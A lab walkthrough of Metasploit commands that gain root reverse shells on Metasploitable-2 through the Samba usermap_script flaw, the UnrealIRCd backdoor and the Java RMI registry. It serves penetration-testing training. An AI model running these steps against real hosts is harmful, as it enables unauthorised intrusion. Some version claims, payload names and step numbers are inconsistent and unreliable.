# Samba "username map script" – Remote Command Execution (Metasploitable-2)

**(Affects Samba smbd 3.x – 4.x | Workgroup: WORKGROUP)**

This vulnerability allows remote command execution by abusing the `username map script` parameter in Samba. Metasploit's `usermap_script` module sends a malicious username containing shell commands, which Samba executes with root privileges.

### Load the Exploit Module
```
use exploit/multi/samba/usermap_script
```

### View Module Information
```
info
```

### Display Required Options
```
show options
```

### Set the Target IP
```
set RHOSTS 192.168.1.244
```

### Set the Target Port
Samba commonly listens on NetBIOS session service port 139:
```
set RPORT 139
```
*(Alternatively, some installations use TCP 445.)*

### 6. Run the Exploit
```
exploit
```

If successful, you get a root shell:
```
id
uid=0(root) gid=0(root)
```

### Select Payload
By default, Metasploit uses:
```
cmd/unix/interact
```

**Reverse shell payload (Unix)**
```
set PAYLOAD cmd/unix/reverse
```

**Show all payload options**
```
show payloads
```

**Select payload by index**
```
set payload 6
```

### 6. Set Local Listener Options (for reverse shell)

**Set LHOST**
```
set LHOST 192.168.1.6
```

**Set LPORT**
```
set LPORT 443
```

### 7. Run the Exploit
```
exploit
```

If successful, you should get a command shell session:
```
[*] Command shell session opened
id
uname -a
```

---

# UnrealIRCd 3.2.8.1 – Backdoor Command Execution (Metasploitable-2)

UnrealIRCd 3.2.8.1 was shipped with a malicious backdoor inserted into the source code. Any command prefixed with `AB;` is executed remotely on the server. Metasploit provides a module to trigger this backdoor and execute arbitrary commands.

```
services -p 6667
```

### Load the Exploit Module
```
use exploit/unix/irc/unreal_ircd_3281_backdoor
```

### 2. Show Module Options
```
show options
```

### 3. Set the Target IP
```
set RHOSTS 192.168.1.244
```

*(Optional) Set global RHOSTS to be used in all modules:*
```
setg RHOSTS 192.168.1.213
```

### 4. Set the Target Port
UnrealIRCd listens on port 6667 (default IRC service):
```
set RPORT 6667
```

### 5. Select Payload
**Example 1 — Reverse shell payload (Unix)**
```
set PAYLOAD cmd/unix/reverse
```

**Show all payload options**
```
show payloads
```

**Select payload by index**
```
set payload 6
```

### 6. Set Local Listener Options (for reverse shell)

**Set LHOST**
```
set LHOST 192.168.1.6
```

**Set LPORT**
```
set LPORT 443
```

### 7. Run the Exploit
```
exploit
```

If successful, you should get a command shell session:
```
[*] Command shell session opened
id
uname -a
```
```

# Java RMI Server – Insecure Default Configuration (Metasploitable-2)

### Remote Java Code Execution (GNU Classpath `grmiregistry`)

The Java RMI Registry included in Metasploitable-2 is configured insecurely, allowing arbitrary remote object deserialization. Metasploit can exploit this to execute arbitrary Java bytecode and obtain a reverse shell.

The service typically listens on:
```
RPORT = 1099
```

### 1. Load the Exploit Module
```
use exploit/multi/misc/java_rmi_server
```

### 2. View Module Information
```
info
```

### 3. Display Current Options
```
show options
```

### 4. Set the Target IP
```
set RHOSTS 192.168.1.244
```

### View Available Payloads
```
show payloads
```

Typical payload options include:
- `java/shell/reverse_tcp`
- `java/meterpreter/reverse_tcp`
- `java/rmi/meterpreter/reverse_tcp`
- etc.

### Choose Payload
For a simple reverse shell:
```
set payload java/shell_reverse_tcp
```

(If using a reverse payload, also set LHOST)
Example:
```
set LHOST 192.168.1.7
set LPORT 443
```

### 7. Launch the Exploit
```
exploit
```

Successful exploitation returns:
```
[+] Command shell session opened ...
id
uname -a
```
```
